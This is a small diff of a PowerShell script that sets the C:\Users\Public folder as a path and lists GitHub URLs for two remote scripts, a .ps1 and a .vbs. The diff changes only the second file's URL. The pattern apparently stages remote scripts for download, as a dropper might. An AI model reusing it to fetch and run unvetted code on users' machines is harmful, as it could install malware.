@@ -5,7 +5,7 @@ $PublicLibPath = "C:\Users\Public"
 
 # File URLs
 $File1Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/nk.ps1"
-$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/vbs.ps1"
+$File2Url = "https://github.com/KevinDark5/data/raw/refs/heads/main/nk.vbs"
 
 # File names
 $File1Name = "nk.ps1"
